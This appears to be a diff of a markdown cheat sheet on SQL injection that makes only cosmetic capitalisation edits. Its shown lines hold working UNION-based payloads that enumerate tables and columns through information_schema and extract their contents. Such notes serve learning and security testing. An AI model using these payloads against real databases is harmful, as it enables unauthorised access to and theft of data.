@@ -143,17 +143,18 @@ is needed.
 1. get column number
 2. get field type
 
-*after that information is collected, it is time to retrieve the table_name of the database schema.
+*after that information is collected, it is time to retrieve the TABLE_NAME of the database schema.
 
 <mark>' UNION SELECT table_name,NULL from information_schema.tables--</mark>
 
-*once table is identified, it is time to retrieve the columns of the table
+*once table is identified, it is time to retrieve the COLUMNS of the table
 
 <mark>' UNION SELECT column_name,NULL from information_schema.columns WHERE table_name='TABLE_NAME'--</mark>
 
-*once table_name and columns are identified, it is time to retrieve the content
+*once table_name and columns are identified, it is time to retrieve the CONTENT
 
 <mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark>
+
 </details>
 <details>
 <summary>ORACLE</summary>
